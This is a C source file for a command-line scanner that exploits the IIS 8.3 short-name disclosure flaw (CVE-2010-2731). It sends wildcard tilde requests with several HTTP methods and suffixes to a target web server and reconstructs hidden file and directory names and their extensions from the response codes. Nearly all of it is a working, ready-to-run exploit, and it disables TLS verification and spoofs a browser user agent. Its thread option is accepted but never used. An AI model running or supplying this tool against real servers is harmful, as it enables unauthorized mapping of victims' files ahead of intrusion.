#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <ctype.h>

#define MAX_URL_LEN 1024
#define MAX_FILENAME_LEN 256
#define MAX_THREADS 20
#define MAX_FOUND_FILES 1000
#define CHARSET "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
#define EXT_CHARSET "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
#define MAX_EXTENSIONS 50

typedef struct {
    char *data;
    size_t size;
    long response_code;
    double response_time;
} response_data_t;

typedef struct {
    char name[64];
    char extension[8];
    int is_directory;
    int confidence;
} found_file_t;

typedef struct {
    char *base_url;
    char *current_path;
    int thread_id;
    int verbose;
    found_file_t *files;
    int *file_count;
    pthread_mutex_t *mutex;
} thread_data_t;

typedef struct {
    char *base_url;
    char method[16];
    char suffix[32];
    int timeout;
    int verbose;
    int threads;
    int max_depth;
    char user_agent[256];
} scan_config_t;

static const char* http_methods[] = {"OPTIONS", "GET", "POST", "DEBUG", "PATCH"};
static const char* common_suffixes[] = {".aspx", ".rem", ".svc", ".xamlx", ".soap", ".asmx", ".ashx"};
static const char* common_extensions[] = {"asp", "aspx", "php", "jsp", "htm", "html", "txt", "pdf", "doc", "xls", "zip", "rar", "exe", "dll", "ini", "cfg", "log", "bak", "old", "tmp"};

found_file_t found_files[MAX_FOUND_FILES];
int total_found = 0;
pthread_mutex_t found_mutex = PTHREAD_MUTEX_INITIALIZER;

static size_t write_callback(void *contents, size_t size, size_t nmemb, response_data_t *response) {
    size_t realsize = size * nmemb;
    char *ptr = realloc(response->data, response->size + realsize + 1);
    
    if (!ptr) return 0;
    
    response->data = ptr;
    memcpy(&(response->data[response->size]), contents, realsize);
    response->size += realsize;
    response->data[response->size] = '\0';
    
    return realsize;
}

int make_request(const char* url, const char* method, response_data_t *response, int timeout, const char* user_agent) {
    CURL *curl;
    CURLcode res;
    struct timespec start, end;
    
    memset(response, 0, sizeof(response_data_t));
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    curl = curl_easy_init();
    if (!curl) return -1;
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, timeout);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    
    res = curl_easy_perform(curl);
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    response->response_time = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1000000000.0;
    
    if (res == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response->response_code);
    }
    
    curl_easy_cleanup(curl);
    return (res == CURLE_OK) ? 0 : -1;
}

int test_pattern(const char* base_url, const char* pattern, const char* method, const char* suffix, int timeout, const char* user_agent, int verbose) {
    char url[MAX_URL_LEN];
    response_data_t response;
    
    snprintf(url, sizeof(url), "%s/%s%s", base_url, pattern, suffix);
    
    if (make_request(url, method, &response, timeout, user_agent) != 0) {
        if (response.data) free(response.data);
        return 0;
    }
    
    int exists = (response.response_code == 404);
    
    if (verbose > 1) {
        printf("[DEBUG] %s %s -> %ld (%.3fs) %s\n", 
               method, url, response.response_code, response.response_time,
               exists ? "EXISTS" : "NOT_FOUND");
    }
    
    if (response.data) free(response.data);
    return exists;
}

int detect_length(const char* base_url, const char* prefix, const char* method, const char* suffix, int timeout, const char* user_agent, int max_len) {
    char pattern[128];
    
    for (int len = 1; len <= max_len; len++) {
        snprintf(pattern, sizeof(pattern), "%s%.*s*~1*", prefix, len, "???????");
        
        if (!test_pattern(base_url, pattern, method, suffix, timeout, user_agent, 0)) {
            return len - 1;
        }
    }
    return max_len;
}

int is_directory(const char* base_url, const char* shortname, const char* method, int timeout, const char* user_agent) {
    char pattern[128];
    response_data_t response;
    char url[MAX_URL_LEN];
    
    snprintf(pattern, sizeof(pattern), "%s~1/.aspx", shortname);
    snprintf(url, sizeof(url), "%s/%s", base_url, pattern);
    
    if (make_request(url, method, &response, timeout, user_agent) == 0) {
        int is_dir = (response.response_code == 404);
        if (response.data) free(response.data);
        return is_dir;
    }
    
    return 0;
}

void enumerate_extensions(const char* base_url, const char* shortname, char* found_ext, const char* method, int timeout, const char* user_agent, int verbose) {
    char pattern[128];
    char current_ext[8] = {0};
    
    for (int i = 0; i < sizeof(common_extensions)/sizeof(common_extensions[0]); i++) {
        snprintf(pattern, sizeof(pattern), "%s~1.%s", shortname, common_extensions[i]);
        
        if (test_pattern(base_url, pattern, method, "", timeout, user_agent, verbose)) {
            strcpy(found_ext, common_extensions[i]);
            return;
        }
    }
    
    for (int pos = 0; pos < 3; pos++) {
        for (int c = 0; c < strlen(EXT_CHARSET); c++) {
            current_ext[pos] = EXT_CHARSET[c];
            current_ext[pos + 1] = '\0';
            
            snprintf(pattern, sizeof(pattern), "%s~1.%s*", shortname, current_ext);
            
            if (test_pattern(base_url, pattern, method, "", timeout, user_agent, verbose)) {
                if (pos == 2 || !test_pattern(base_url, pattern, method, "", timeout, user_agent, verbose)) {
                    strcpy(found_ext, current_ext);
                    return;
                }
            }
        }
    }
}

void enumerate_character(const char* base_url, const char* prefix, int position, char* result, const char* method, const char* suffix, int timeout, const char* user_agent, int verbose) {
    char pattern[128];
    char test_prefix[64];
    
    strcpy(test_prefix, prefix);
    
    for (int c = 0; c < strlen(CHARSET); c++) {
        test_prefix[position] = CHARSET[c];
        test_prefix[position + 1] = '\0';
        
        snprintf(pattern, sizeof(pattern), "%s*~1*", test_prefix);
        
        if (test_pattern(base_url, pattern, method, suffix, timeout, user_agent, verbose)) {
            result[position] = CHARSET[c];
            return;
        }
    }
    
    result[position] = '\0';
}

void add_found_file(const char* name, const char* extension, int is_dir, int confidence) {
    pthread_mutex_lock(&found_mutex);
    
    if (total_found < MAX_FOUND_FILES) {
        strcpy(found_files[total_found].name, name);
        strcpy(found_files[total_found].extension, extension);
        found_files[total_found].is_directory = is_dir;
        found_files[total_found].confidence = confidence;
        total_found++;
    }
    
    pthread_mutex_unlock(&found_mutex);
}

void enumerate_shortnames(const char* base_url, scan_config_t* config) {
    char current_name[64] = {0};
    char found_extension[8] = {0};
    int method_idx = 0;
    int suffix_idx = 0;
    
    printf("[*] Starting comprehensive IIS shortname enumeration\n");
    printf("[*] Target: %s\n", base_url);
    printf("[*] Method: %s, Timeout: %ds, Threads: %d\n\n", 
           config->method, config->timeout, config->threads);
    
    for (method_idx = 0; method_idx < sizeof(http_methods)/sizeof(http_methods[0]); method_idx++) {
        for (suffix_idx = 0; suffix_idx < sizeof(common_suffixes)/sizeof(common_suffixes[0]); suffix_idx++) {
            
            printf("[+] Testing with %s method and %s suffix\n", 
                   http_methods[method_idx], common_suffixes[suffix_idx]);
            
            for (int c = 0; c < strlen(CHARSET); c++) {
                memset(current_name, 0, sizeof(current_name));
                current_name[0] = CHARSET[c];
                
                char pattern[128];
                snprintf(pattern, sizeof(pattern), "%c*~1*", CHARSET[c]);
                
                if (test_pattern(base_url, pattern, http_methods[method_idx], 
                                common_suffixes[suffix_idx], config->timeout, 
                                config->user_agent, config->verbose)) {
                    
                    int max_len = detect_length(base_url, current_name, 
                                              http_methods[method_idx], 
                                              common_suffixes[suffix_idx], 
                                              config->timeout, config->user_agent, 6);
                    
                    for (int pos = 1; pos < max_len; pos++) {
                        enumerate_character(base_url, current_name, pos, current_name,
                                          http_methods[method_idx], common_suffixes[suffix_idx],
                                          config->timeout, config->user_agent, config->verbose);
                    }
                    
                    int is_dir = is_directory(base_url, current_name, 
                                            http_methods[method_idx], 
                                            config->timeout, config->user_agent);
                    
                    memset(found_extension, 0, sizeof(found_extension));
                    if (!is_dir) {
                        enumerate_extensions(base_url, current_name, found_extension,
                                           http_methods[method_idx], config->timeout, 
                                           config->user_agent, config->verbose);
                    }
                    
                    add_found_file(current_name, found_extension, is_dir, 85);
                    
                    printf("    [FOUND] %s%s%s (%s, confidence: 85%%)\n", 
                           current_name, 
                           strlen(found_extension) > 0 ? "." : "",
                           found_extension,
                           is_dir ? "directory" : "file");
                }
            }
        }
    }
}

void print_results() {
    printf("\n=== ENUMERATION RESULTS ===\n");
    printf("Total items found: %d\n\n", total_found);
    
    printf("Directories:\n");
    for (int i = 0; i < total_found; i++) {
        if (found_files[i].is_directory) {
            printf("  %s/ (confidence: %d%%)\n", 
                   found_files[i].name, found_files[i].confidence);
        }
    }
    
    printf("\nFiles:\n");
    for (int i = 0; i < total_found; i++) {
        if (!found_files[i].is_directory) {
            printf("  %s%s%s (confidence: %d%%)\n", 
                   found_files[i].name,
                   strlen(found_files[i].extension) > 0 ? "." : "",
                   found_files[i].extension,
                   found_files[i].confidence);
        }
    }
    
    if (total_found > 0) {
        printf("\n[!] Potential security issues found. Review discovered files/directories.\n");
    } else {
        printf("\n[+] No shortname disclosure vulnerability detected.\n");
    }
}

void print_usage(const char* program_name) {
    printf("IIS Shortname Enumeration Scanner v2.0\n");
    printf("Advanced tool for detecting IIS 8.3 shortname disclosure (CVE-2010-2731)\n\n");
    printf("Usage: %s [OPTIONS] <target_url>\n\n", program_name);
    printf("Options:\n");
    printf("  -m METHOD     HTTP method (default: OPTIONS)\n");
    printf("  -s SUFFIX     URL suffix (default: .aspx)\n");
    printf("  -t TIMEOUT    Request timeout in seconds (default: 10)\n");
    printf("  -T THREADS    Number of threads (default: 1)\n");
    printf("  -v            Verbose output\n");
    printf("  -vv           Very verbose (debug) output\n");
    printf("  -u AGENT      Custom User-Agent string\n");
    printf("  -h            Show this help\n\n");
    printf("Examples:\n");
    printf("  %s http://target.com\n", program_name);
    printf("  %s -v -m POST -t 5 https://target.com/app\n", program_name);
    printf("  %s -vv -T 5 -u \"Custom-Agent\" http://target.com\n", program_name);
    printf("\nNote: This tool is for authorized security testing only.\n");
}

int main(int argc, char *argv[]) {
    scan_config_t config = {
        .method = "OPTIONS",
        .timeout = 10,
        .verbose = 0,
        .threads = 1,
        .max_depth = 1
    };
    
    strcpy(config.suffix, ".aspx");
    strcpy(config.user_agent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    
    int opt;
    while ((opt = getopt(argc, argv, "m:s:t:T:u:vhd:")) != -1) {
        switch (opt) {
            case 'm':
                strncpy(config.method, optarg, sizeof(config.method) - 1);
                break;
            case 's':
                strncpy(config.suffix, optarg, sizeof(config.suffix) - 1);
                break;
            case 't':
                config.timeout = atoi(optarg);
                break;
            case 'T':
                config.threads = atoi(optarg);
                if (config.threads > MAX_THREADS) config.threads = MAX_THREADS;
                break;
            case 'u':
                strncpy(config.user_agent, optarg, sizeof(config.user_agent) - 1);
                break;
            case 'v':
                config.verbose++;
                break;
            case 'd':
                config.max_depth = atoi(optarg);
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    if (optind >= argc) {
        printf("Error: Target URL required\n\n");
        print_usage(argv[0]);
        return 1;
    }
    
    config.base_url = argv[optind];
    
    if (config.timeout < 1 || config.timeout > 60) {
        printf("Error: Timeout must be between 1 and 60 seconds\n");
        return 1;
    }
    
    printf("=== IIS Shortname Enumeration Scanner ===\n");
    printf("Target: %s\n", config.base_url);
    printf("Configuration: %s method, %s suffix, %ds timeout\n\n", 
           config.method, config.suffix, config.timeout);
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    enumerate_shortnames(config.base_url, &config);
    
    print_results();
    
    curl_global_cleanup();
    
    return 0;
}